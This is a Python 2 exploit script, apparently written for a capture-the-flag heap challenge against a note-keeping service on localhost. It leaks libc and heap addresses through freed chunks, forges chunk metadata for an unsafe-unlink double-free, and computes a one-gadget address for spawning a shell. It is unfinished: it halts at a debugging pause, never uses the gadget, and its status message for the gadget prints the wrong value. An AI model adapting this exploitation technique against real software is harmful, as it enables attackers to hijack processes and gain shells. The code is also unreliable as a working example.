import time
import socket
import struct


s = socket.create_connection(("localhost", 4444))

def p(a):
    return struct.pack("<Q", a)
def u(a):
    return struct.unpack("<Q", a)[0]

def r_until(s, delim):
    buf=""
    while delim not in buf:
        buf+=s.recv(1)
    return buf

def send(s, msg):
    s.send(msg)

def interact(s):
    import telnetlib
    t=telnetlib.Telnet()
    t.sock = s
    t.interact()

def list_note(s):
    send(s, "1\n")
    return r_until(s, "choice: ")

def add_note(s, content):
    send(s, "2\n")
    send(s, str(len(content))+"\n")
    send(s, content)
    r_until(s, "choice: ")

def edit_note(s, num, content):
    send(s, "3\n")
    send(s, str(num)+"\n")
    send(s, str(len(content))+"\n")
    send(s, content)
    r_until(s, "choice: ")

def del_note(s, num):
    send(s, "4\n")
    send(s, str(num)+"\n")
    r_until(s, "choice: ")

def leak_libc(s):
    add_note(s, "A"*0x10)
    add_note(s, "B"*0x10)
    del_note(s, 0) # not chunk 2 otherwise will become wilderness and no fwd and bck ptrs
    add_note(s, "C"*8) #get bck
    #print s.recv(4096)

    leaked = list_note(s)
    del_note(s, 1)
    del_note(s, 0)

    idx = leaked.find("C"*8)+8
    return u(leaked[idx:idx+6].ljust(8, "\x00"))

def leak_heap(s):
    add_note(s, "A"*0x10)
    add_note(s, "B"*0x10) #pad to prevent coalescing
    add_note(s, "C"*0x10)
    add_note(s, "D"*0x10) #limit to wilderness
    del_note(s, 2)
    del_note(s, 0) #will have links to #2

    add_note(s, "A"*8) #do not need fwd unless leak libc freelist again
    leaked = list_note(s)
    del_note(s, 0)
    del_note(s, 1)
    del_note(s, 3)
    idx = leaked.find("A"*8)+8
    return u(leaked[idx:leaked.find('\n')].ljust(8, "\x00"))

def exploit(s, leaked_chunk):
    add_note(s, "A"*0x100)
    add_note(s, "B"*0x100)
    add_note(s, "C"*0x100)

    #del does not zero ptr in table nor check the inuse field
    del_note(s, 2)
    del_note(s, 1)
    del_note(s, 0)

    #craft fake metadata
    # BK->FD == P / FD->BK == P
    fd = leaked_chunk - 6104 - 24 #leaked - 6104 => ptr to #1
    bk = fd + 8

    payload = p(0) + p(1) #header inuse for #0
    payload += p(fd) + p(bk) + "A"*(0x100-0x20)
    payload += p(0x100) + p(0x110) + "A"*0x100
    payload += p(0) + p(0x111) + "A"*(0x100-0x20)
    add_note(s, payload)

    del_note(s, 1) # double free !
    raw_input("gdb")

r_until(s, "choice: ")

libc_addr = leak_libc(s)
libc = libc_addr - 0x386e98 #offset from bss to base
oneshot = libc + 0x3fc17
print '[+] leaked freelist node in libc: %s' %  hex(libc_addr)
print '[+] oneshot execve("/bin/sh")@libc at: %s' %  hex(libc_addr)

heap = leak_heap(s) #addr of chunk #2 if all have same size
print '[+] leaked heap addr: %s' % hex(heap)

exploit(s, heap)


